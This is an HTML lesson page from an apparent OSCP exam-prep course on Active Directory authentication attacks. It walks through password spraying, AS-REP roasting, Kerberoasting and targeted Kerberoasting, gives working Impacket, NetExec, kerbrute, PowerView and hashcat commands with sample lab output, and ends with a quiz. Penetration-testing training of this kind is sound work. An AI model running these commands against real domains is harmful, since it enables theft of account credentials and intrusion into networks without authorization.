@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 11 · Active Directory: Authentication Attacks</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0010-active-directory-enumeration.html">Lesson 10</a> · <strong>Lesson 11</strong> · <a href="../reference/active-directory.html">Active Directory</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 11 · Active Directory</span>
+<h1>Active Directory: Authentication Attacks</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: turn domain enumeration into actual credentials using the Kerberos attacks.</p>
+
+<p class="lead">Last lesson you mapped the domain. Now you turn that map into <strong>credentials</strong> — not by guessing, but by abusing the way Active Directory is <em>designed</em> to hand out tickets. Kerberoasting and AS-REP roasting let you extract crackable password hashes for domain accounts using nothing but a valid login (sometimes not even that), then crack them offline at your leisure. This is the highest-yield phase of the whole AD set, and it's where the 40-point machine usually starts to fall.</p>
+
+<h2>Kerberos in four sentences</h2>
+<p>You don't need the full RFC — you need the two doors that are left open. When you log in, your client does an <strong>AS-REQ/AS-REP</strong> with the domain controller and gets a <strong>TGT</strong> (Ticket-Granting Ticket), which proves who you are. When you want to reach a service (a SQL server, a file share, a web app), your client sends a <strong>TGS-REQ</strong> naming that service by its <strong>SPN</strong> (Service Principal Name) and gets back a <strong>TGS</strong> — a service ticket <em>encrypted with the service account's password hash</em>. Two facts make this abusable: <strong>(a)</strong> some accounts are flagged "do not require pre-authentication", so the DC will hand out their AS-REP to <em>anyone</em> who asks; and <strong>(b)</strong> <em>any</em> authenticated user can request a TGS for <em>any</em> SPN — and that ticket is encrypted with a key derived from the service account's password, which you can crack offline.</p>
+
+<div class="box note">
+<span class="box-title">The whole trick, in one idea</span>
+A Kerberos ticket is <strong>encrypted with a password-derived key</strong>. If the protocol will hand you that ticket, it has handed you a hash to crack — and cracking happens on <em>your</em> machine, where there is no lockout, no logging, and no time limit.
+</div>
+
+<p>Three attacks come out of those two design facts, plus spraying for the first foothold. Keep this table in your head — it's the decision tree for the rest of the lesson:</p>
+<table>
+<thead><tr><th>Attack</th><th>Needs</th><th>Yields</th><th>Noise</th><th>Hashcat</th></tr></thead>
+<tbody>
+<tr><td><strong>Password spray</strong></td><td>A user list</td><td>A first valid credential</td><td>High (lockout risk)</td><td>—</td></tr>
+<tr><td><strong>AS-REP roast</strong></td><td>Usernames only</td><td>Hash for pre-auth-off accounts</td><td>Very low</td><td><code>18200</code></td></tr>
+<tr><td><strong>Kerberoast</strong></td><td>Any 1 valid login</td><td>Hash for every SPN account</td><td>Low</td><td><code>13100</code></td></tr>
+</tbody>
+</table>
+<p>Spraying gets you <em>in</em>; AS-REP roasting and Kerberoasting <em>manufacture more credentials</em> once you're in (and AS-REP roasting can even run before you're in). The rest of this lesson is each row in depth.</p>
+
+<h2>Password spraying — wide, slow, lockout-aware</h2>
+<p>You met spraying in Lesson 08; in AD it becomes a domain-wide move. Your <strong>user list</strong> is the fuel for this attack <em>and</em> for AS-REP roasting, so build it first — from Lesson 10's enumeration (<code>nxc smb DC -u user -p pass --users</code>, RID brute force, or BloodHound), or by validating guesses with <code>kerbrute userenum</code>, which confirms valid names without a single failed logon. With a clean <code>users.txt</code> in hand, try <em>one</em> common password against <em>every</em> user — the inverse of brute force, so you stay under per-account lockout thresholds. People pick seasonal and company-themed passwords; one of a hundred accounts is often <code>Autumn2025!</code> or <code>Welcome1</code>.</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u users.txt -p 'Season2025!' --continue-on-success</span>
+<span class="o">SMB  10.10.10.10  445  DC01  [+] corp.local\j.miller:Season2025!</span>
+<span class="o">SMB  10.10.10.10  445  DC01  [-] corp.local\a.kane:Season2025! STATUS_LOGON_FAILURE</span></pre>
+<p>NetExec (<code>nxc</code>, formerly CrackMapExec) sprays SMB and flags every hit with <code>[+]</code>. <code>--continue-on-success</code> keeps going so you collect <em>all</em> valid pairs, not just the first. You can also spray Kerberos directly, which is quieter than SMB because a pre-auth failure isn't a "logon" event:</p>
+<pre><span class="p">$</span> <span class="o">kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Season2025!'</span>
+<span class="o">2025/06/26 12:01:14 &gt;  [+] VALID LOGIN:  j.miller@corp.local:Season2025!</span></pre>
+<p>The other half of spraying is <strong>credential reuse</strong>: when you crack <em>one</em> password (here, or via the roasts below), spray <em>that</em> exact password back across every user — people and admins reuse passwords constantly, so one crack often unlocks several accounts. That single hit feeds straight into the reuse loop at the end of this lesson.</p>
+
+<div class="box warn">
+<span class="box-title">Check the lockout policy before you spray</span>
+A spray that trips lockout locks out real users, alerts the blue team, and on the exam can wall you off from accounts you need. Read the policy first — <code>nxc smb 10.10.10.10 -u user -p pass --pass-pol</code> — note the <strong>lockout threshold</strong> and <strong>observation window</strong>, then spray <em>fewer</em> attempts than the threshold and wait out the window between rounds. One password per round, never two.
+</div>
+
+<h2>AS-REP roasting — free hashes, no password needed</h2>
+<p>Some accounts have <strong>"Do not require Kerberos pre-authentication"</strong> set. Normally pre-auth makes you prove you know the password <em>before</em> the DC sends anything encrypted. Turn it off and the DC will return an AS-REP — part of which is encrypted with the user's password hash — to <em>anyone</em> who names the account. So you can request it and crack it offline. The beautiful part: <strong>you need no credentials at all</strong>, just a list of valid usernames (which Lesson 10 gave you).</p>
+<pre><span class="p">$</span> <span class="o">impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10</span>
+<span class="o">[*] Getting TGT for j.miller</span>
+<span class="o">[-] User a.kane doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="h">$krb5asrep$23$j.miller@CORP.LOCAL:a1b2c3...$f00d...</span></pre>
+<p><code>-no-pass</code> says "I have no creds — just probe these names." Accounts <em>with</em> pre-auth disabled spit out a <code>$krb5asrep$</code> hash; the rest are skipped. If you already hold a domain account, drop <code>-no-pass</code> and add <code>-request</code> to have the DC enumerate the flagged accounts for you:</p>
+<pre><span class="p">$</span> <span class="o">impacket-GetNPUsers corp.local/bob:'Spring2025!' -request -dc-ip 10.10.10.10</span></pre>
+<p>The flag you're hunting is <code>DONT_REQ_PREAUTH</code> in the account's <code>userAccountControl</code>. With a credential you can list the mis-set accounts directly before roasting them — handy for confirming a target exists:</p>
+<pre><span class="p">$</span> <span class="o">nxc ldap 10.10.10.10 -u bob -p 'Spring2025!' --asreproast asrep.out</span>
+<span class="c"># or, on Windows with PowerView:</span>
+<span class="p">PS&gt;</span> <span class="o">Get-DomainUser -PreauthNotRequired | select samaccountname</span></pre>
+<p>Crack the hash offline with hashcat mode <strong>18200</strong>:</p>
+<pre><span class="p">$</span> <span class="o">hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule</span>
+<span class="h">$krb5asrep$23$j.miller@CORP.LOCAL:...:Autumn2024</span></pre>
+<p>AS-REP roasting costs nothing and risks nothing — if even one account is mis-set, it's a free credential. Always try it.</p>
+
+<h2>Kerberoasting — the workhorse</h2>
+<p>This is the one you'll reach for on almost every AD box. Recall fact (b): <strong>any authenticated user can request a TGS for any SPN</strong>, and that ticket is encrypted with the service account's password hash. So with a single valid domain login, you ask the DC for service tickets for every account that has an SPN, then crack those tickets offline. No special privileges, no exploit — you are using Kerberos exactly as intended.</p>
+<pre><span class="p">$</span> <span class="o">impacket-GetUserSPNs corp.local/bob:'Spring2025!' -dc-ip 10.10.10.10 -request</span>
+<span class="o">ServicePrincipalName            Name      MemberOf                                  PasswordLastSet</span>
+<span class="o">------------------------------  --------  ----------------------------------------  -------------------</span>
+<span class="o">MSSQLSvc/sql01.corp.local:1433  svc_sql   CN=SQLAdmins,CN=Users,DC=corp,DC=local    2021-03-02 09:14:55</span>
+<span class="o">HTTP/web01.corp.local           svc_web   CN=Domain Users,CN=Users,DC=corp,DC=local 2023-11-20 16:02:11</span>
+
+<span class="h">$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local~1433*$9a8b...$c0ffee...</span></pre>
+<p><code>-request</code> tells Impacket to actually pull the tickets, not just list the SPNs. Each account with an SPN yields a <code>$krb5tgs$</code> hash. Crack with hashcat mode <strong>13100</strong>:</p>
+<pre><span class="p">$</span> <span class="o">hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule</span></pre>
+
+<div class="box note">
+<span class="box-title">Already on a Windows box? Use Rubeus</span>
+Impacket runs from your Kali attacker host over the network. If you instead have a shell <em>on a domain-joined Windows machine</em>, <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> does the same job from the inside: <code>Rubeus.exe kerberoast /outfile:hashes.txt</code> and <code>Rubeus.exe asreproast</code>. Same hashes, same hashcat modes — just a different launch point. Either tool is fine; pick whichever matches where your shell is.
+</div>
+
+<h3>Why this works so often</h3>
+<p>Service accounts are the soft underbelly of AD. They tend to have:</p>
+<ul>
+<li><strong>Weak, human-chosen passwords</strong> — set once, by an admin, often something like <code>Password123!</code> or the app name plus a year.</li>
+<li><strong>Passwords that never expire and never rotate</strong> — changing a service account password can break the service, so nobody touches it for years. That old password predates today's policy and sits in <code>rockyou.txt</code>.</li>
+<li><strong>High privilege</strong> — service accounts are frequently in <code>Domain Admins</code> or other powerful groups "because it was easier," so cracking one can hand you the domain.</li>
+</ul>
+<p>That combination — crackable password attached to a privileged account — is why Kerberoasting is the single most reliable AD attack. Look at the <code>MemberOf</code> column above: <code>svc_sql</code> is in <code>SQLAdmins</code>. Note which roasted accounts are privileged; those are your priority to crack.</p>
+
+<h3>Encryption type decides how fast it cracks</h3>
+<p>Read the number right after <code>$krb5tgs$</code>. <code>$krb5tgs$<strong>23</strong>$</code> means the ticket is <strong>RC4-HMAC</strong> (etype 23) — the legacy, fast-to-crack case, and still the common one because many service accounts predate AES. An <code>$krb5tgs$<strong>18</strong>$</code> (or <code>17</code>) ticket is <strong>AES</strong>, far slower to crack and a different hashcat mode (<code>19700</code> / <code>19600</code>). Same idea for AS-REP: mode <code>18200</code> is the RC4 case you'll usually get. Practically: roast, then point hashcat at whichever <code>$krb5tgs$</code> hashes you pulled — RC4 ones fall fastest, so start there.</p>
+
+<h3>Targeted Kerberoasting and the re-run habit</h3>
+<p>Two extensions worth knowing. <strong>Targeted Kerberoasting</strong>: if BloodHound shows you have <code>GenericWrite</code> or <code>GenericAll</code> over a user that currently has <em>no</em> SPN, you can write a (fake) SPN onto that account, roast it, crack it, then remove the SPN to clean up — manufacturing a Kerberoastable target on demand:</p>
+<pre><span class="p">PS&gt;</span> <span class="o">Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}</span>
+<span class="p">PS&gt;</span> <span class="o">Get-DomainSPNTicket -SPN 'fake/svc' | select Hash</span>   <span class="c"># roast, then crack -m 13100</span>
+<span class="p">PS&gt;</span> <span class="o">Set-DomainObject -Identity victim -Clear serviceprincipalname</span>  <span class="c"># tidy up</span></pre>
+<p>(<code>targetedKerberoast.py</code> automates the same dance from Linux.) Second, and more important for methodology: <strong>every one of these attacks can be re-run as each new identity you gain.</strong> A new user sees different SPNs, different ACLs, different reachable hosts — so re-roast and re-spray each time you crack a credential.</p>
+
+<h2>Cracking the tickets offline</h2>
+<p>All three attacks end the same way: a hash on your disk and an offline crack. Offline is the whole point — <strong>no lockout, no logging, no rate limit</strong>, so you can throw your full GPU at it for as long as the exam allows. A practical ladder:</p>
+<ol class="steps">
+<li><strong>Straight wordlist.</strong> <code>hashcat -m 13100 hash rockyou.txt</code>. Most service-account passwords fall here on the first pass.</li>
+<li><strong>Add rules.</strong> <code>-r rules/best64.rule</code> mutates each word (capitalisation, digits, <code>!</code> suffix) — exactly how humans build <code>Password123!</code>. This is the highest-value upgrade.</li>
+<li><strong>Bigger lists / masks.</strong> If <code>rockyou</code> misses, try a larger list or a mask for a known pattern (e.g. <code>-a 3 ?u?l?l?l?l?l?d?d</code> for "Word + 2 digits").</li>
+</ol>
+<p>Remember the encryption type: <code>$krb5tgs$23$</code> (RC4) cracks far faster than <code>$krb5tgs$18$</code> (AES), so prioritise the RC4 hashes. John the Ripper works too (<code>john --format=krb5tgs</code>), but hashcat's GPU speed wins on the exam. Every password you recover is points on the 40-point AD set — and the key to the next door.</p>
+
+<h2>The reuse loop — and the bridge to Lesson 12</h2>
+<p>One cracked credential is never just one credential. The moment you crack <code>svc_sql</code>, feed it back into the machine: re-run BloodHound and enumeration <em>as svc_sql</em>. That identity may own ACLs, sessions, or group memberships your first user never saw — and new attack paths appear that were invisible a minute ago. Crack → re-enumerate → find new paths → move → repeat. That loop is the engine of the entire AD set, and following the freshly-cracked credential into lateral movement is exactly where Lesson 12 picks up.</p>
+
+<div class="box mantra">
+Active Directory attacks its own tickets.<br>
+Ask politely, crack offline, then become the account you cracked.
+</div>
+
+<h2>Worked example — from one user to a privileged account</h2>
+<p>You hold a single low-value domain account, <code>bob</code>, from a Lesson 08 spray. Kerberoast the domain:</p>
+<pre><span class="p">$</span> <span class="o">impacket-GetUserSPNs corp.local/bob:'Spring2025!' -dc-ip 10.10.10.10 -request -outputfile svc.hash</span>
+<span class="o">ServicePrincipalName            Name      MemberOf                                PasswordLastSet</span>
+<span class="o">------------------------------  --------  --------------------------------------  -------------------</span>
+<span class="o">MSSQLSvc/sql01.corp.local:1433  svc_sql   CN=SQLAdmins,CN=Users,DC=corp,DC=local  2021-03-02 09:14:55</span>
+<span class="o">[*] Saved TGS for svc_sql to svc.hash</span></pre>
+<p><code>svc_sql</code>'s password was last set in 2021 and never rotated — a prime target. Crack the saved ticket:</p>
+<pre><span class="p">$</span> <span class="o">hashcat -m 13100 svc.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule</span>
+<span class="o">Session..........: hashcat</span>
+<span class="o">Status...........: Cracked</span>
+<span class="h">$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/...*$...:Password123!</span></pre>
+<p>You now hold <strong><code>svc_sql:Password123!</code></strong>. Confirm it works domain-wide and check what it can reach:</p>
+<pre><span class="p">$</span> <span class="o">nxc smb 10.10.10.10 -u svc_sql -p 'Password123!'</span>
+<span class="o">SMB  10.10.10.10  445  DC01  [+] corp.local\svc_sql:Password123! </span></pre>
+<p>And because <code>svc_sql</code> sits in <code>SQLAdmins</code>, this credential is a stepping stone, not an endpoint. Re-run BloodHound as <code>svc_sql</code> and a path toward Domain Admin lights up — which is exactly the move Lesson 12 makes with it. Record the credential in your box notes now; you will reuse it.</p>
+
+<div class="box warn">
+<span class="box-title">If a Kerberos command throws KRB_AP_ERR_SKEW, fix your clock</span>
+Kerberos refuses tickets when the client and DC clocks differ by more than five minutes. The classic symptom is <code>KRB_AP_ERR_SKEW (Clock skew too great)</code> on an otherwise-correct command. Sync to the DC before retrying: <code>sudo ntpdate 10.10.10.10</code> (or <code>sudo rdate -n 10.10.10.10</code>). When a roast "should work" but errors out, suspect the clock and the domain name resolution (<code>/etc/hosts</code> pointing <code>corp.local</code> at the DC) before you suspect the attack.
+</div>
+
+<h2>What to try first</h2>
+<p>Spend your effort where the payoff is highest and the noise is lowest:</p>
+<ol class="steps">
+<li><strong>Kerberoast immediately.</strong> The moment you have <em>any</em> valid domain credential, run <code>GetUserSPNs -request</code>. High-yield, low-noise (a normal TGS request looks like ordinary activity), and it routinely hands over privileged accounts.</li>
+<li><strong>AS-REP roast — it's free.</strong> It needs no credential, only usernames, so run it even before you have a foothold. If any account is mis-flagged, you get a hash for nothing.</li>
+<li><strong>Spray carefully when stuck.</strong> Powerful for getting that first credential, but lockout-risky and noisy. Always read the lockout policy first and stay under the threshold.</li>
+</ol>
+<p>Each cracked password is worth real points on the 40-point AD set — and more importantly, it's the key to the next door. Crack it, then reuse it.</p>
+
+<h2>Check yourself</h2>
+<p>Retrieve before you reason — feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — the two pages to keep open</span>
+The <a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html">HackTricks Kerberoasting / AS-REP roasting</a> pages walk the exact mechanics and commands, and the <a href="https://github.com/fortra/impacket">Impacket suite</a> ships the tools you'll actually run (<code>GetUserSPNs</code>, <code>GetNPUsers</code>). Pair them with hashcat's example-hashes page to confirm the right mode (<strong>13100</strong> for TGS, <strong>18200</strong> for AS-REP).<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 12</span>
+In a lab domain (TJ Null's list on Hack The Box / Proving Grounds), Kerberoast <em>and/or</em> AS-REP roast at least one account, then crack the ticket with hashcat. Record the cracked credential under "Credentials" in your box notes — you'll feed it straight into lateral movement next lesson.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Kerberos attacks:</strong> <strong>Sauna</strong> (AS-REP roast) &amp; <strong>Active</strong> (Kerberoast) — HTB · AD · Easy; <strong>Resolute</strong> (HTB · Med) for password spraying. <a href="../reference/practice-boxes.html#pb-11">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Paste me a <code>$krb5tgs$</code> or <code>$krb5asrep$</code> hash that won't crack and we'll fix the mode, the wordlist, or the rules together. Next: <strong>Lesson 12 — Active Directory: Lateral Movement to Domain Admin</strong> — taking the credential you just cracked and walking it across the domain to the top.
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html">HackTricks — Kerberoasting &amp; AS-REP Roasting</a> (mechanics + commands) · <a href="https://github.com/fortra/impacket">Fortra — Impacket</a> (<code>GetUserSPNs</code>, <code>GetNPUsers</code>) · <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat example hashes</a> (modes 13100 / 18200). Local commands: <a href="../reference/active-directory.html">Active Directory cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0010-active-directory-enumeration.html">← Lesson 10: Active Directory: Fundamentals &amp; Enumeration</a></span>
+<span><a href="./0012-active-directory-lateral-movement.html">Next → Lesson 12: Active Directory: Lateral Movement to Domain Admin</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "Which attack needs NO valid credentials — just a list of usernames — to produce crackable hashes?",
+    options: ["AS-REP roasting an account", "Kerberoasting a SQL SPN", "SMB password spraying", "Targeted Kerberoasting"],
+    answer: 0,
+    explain: "Accounts with pre-auth disabled return an AS-REP to anyone who names them, so usernames alone are enough."
+  },
+  {
+    prompt: "What exactly does Kerberoasting request from the domain controller?",
+    options: ["A TGS ticket for each SPN account", "The DC's own machine password hash", "A plaintext dump of all passwords", "An AS-REP for pre-auth-off users"],
+    answer: 0,
+    explain: "Any authenticated user can ask for a TGS for any SPN; that ticket is encrypted with the service account's password hash."
+  },
+  {
+    prompt: "You have a Kerberoast ($krb5tgs$) hash. Which hashcat mode cracks it?",
+    options: ["18200, the AS-REP roast mode", "13100, the Kerberoast TGS mode", "1000, the plain NTLM mode", "5600, the NetNTLMv2 mode"],
+    answer: 1,
+    explain: "TGS tickets are mode 13100; mode 18200 is for AS-REP ($krb5asrep$) hashes instead."
+  },
+  {
+    prompt: "Why do Kerberoasted service-account hashes crack so often?",
+    options: ["Kerberos tickets use no encryption at all", "Hashcat brute-forces any key instantly", "Service passwords are weak and never rotated", "The DC leaks the plaintext with the ticket"],
+    answer: 2,
+    explain: "Service accounts get human-chosen passwords that are set once and never expire, so they predate policy and sit in rockyou."
+  },
+  {
+    prompt: "You're about to password spray a domain. What must you do first to stay safe?",
+    options: ["Disable the domain's audit logging first", "Spray two passwords every single round", "Crack every TGS ticket beforehand", "Read the lockout policy and stay under it"],
+    answer: 3,
+    explain: "Check the threshold and observation window, then try one password per round below that limit so you don't lock real users out."
+  },
+  {
+    prompt: "You just cracked svc_sql:Password123!. What's the highest-value next move?",
+    options: ["Re-enumerate the domain as svc_sql", "Stop — you already have the points", "Spray that password everywhere blindly", "Delete svc_sql to cover tracks"],
+    answer: 0,
+    explain: "Feed the credential back in: re-run BloodHound as svc_sql and new ACLs, sessions, and paths to Domain Admin appear."
+  }
+]);
+</script>
+
+</body>
+</html>
